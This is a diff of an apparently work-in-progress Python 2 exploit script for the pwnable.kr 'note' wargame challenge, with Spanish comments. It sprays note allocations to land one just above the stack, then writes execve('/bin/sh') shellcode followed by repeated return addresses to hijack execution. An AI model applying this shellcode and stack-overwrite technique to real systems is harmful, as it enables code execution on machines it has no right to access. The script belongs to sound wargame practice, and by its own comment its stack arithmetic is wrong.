@@ -22,10 +22,11 @@ u32 = lambda data: struct.unpack("I", data)[0]
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(60)
-host = 'pwnable.kr'
 host = '0'
-s.connect(('0', 9019))
+host = 'pwnable.kr'
+s.connect((host, 9019))
 
+stack_base = 0xffffe000
 iteraciones = 1
 notas = []
 
@@ -71,6 +72,16 @@ def interactive():
     t = telnetlib.Telnet()
     t.sock = s
     t.interact()
+
+def calculate_stack_top():
+	# lo calcula mal
+	stack_top  = stack_base - 132 * 1024
+	if iteraciones >= 114:
+		stack_top -= int( (iteraciones - 110) // 4 ) * 4 * 1024
+	return stack_top
+
+def get_target_note():
+	return calculate_stack_top() - 4096
 
 def create_note():
 	global iteraciones
@@ -146,35 +157,37 @@ def get_note_ontop_of_stack():
 	global notas
 	while len(notas) != 255:
 		num, addr = create_note()
+		print iteraciones
 		addr = int(addr, 16)
+		target = get_target_note()
 		if addr < 0xfffdd000 and addr > 0xf7ffe000:
 			notas.append((num, addr))
-			print 'aloco: {:d}, iteraciones: {:d}, distancia: {}'.format(len(notas), iteraciones, hex(0xfffdd000 - addr))
+			print 'aloco:{}, num: {}, iteraciones: {:d}, distancia: {}'.format(hex(addr), num, iteraciones, hex(target - addr))
+			nota_max = max(notas, key=lambda n:n[1])
+			if nota_max[1] >= target:
+				print 'eureka!'
+				return nota_max
 		else:
 			delete_note(num)
-	while len(notas) != 256:
-		num, addr = create_note()
-		addr = int(addr, 16)
-		if addr == 0xfffdc000:
-			notas.append((num, addr))
-			return num, addr
-		else:
-			delete_note(num)
+			print iteraciones
+	print 'runned out of notes!!'
+	exit()
 
 def main():
 	recvuntil('5. exit\n')
 	num, addr = get_note_ontop_of_stack()
+	stack_addr = addr + 4096
 	print 'nota encima del stack\naddr: {}'.format(hex(addr))
-	#ret_addr = 0xffffd55c - (1072 * iteraciones)
-	#distancia = ret_addr - addr
 
 	# http://shell-storm.org/shellcode/files/shellcode-575.php
 	payload  = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
-	payload += 'A' * 4096 - len(payload)
-	#payload += 'B' * ??
-	#payload += p32(addr)
-	#write_note(num, payload)
-	#interactive()
+	payload += 'A' * 3
+	payload += p32(addr) * (4096 - len(payload))
+	#payload += 'B' * 596820
+	#payload += p32(addr) * 4096
+	write_note(num, payload)
+	exit()
+	interactive()
 	return
 
 if __name__ == '__main__':
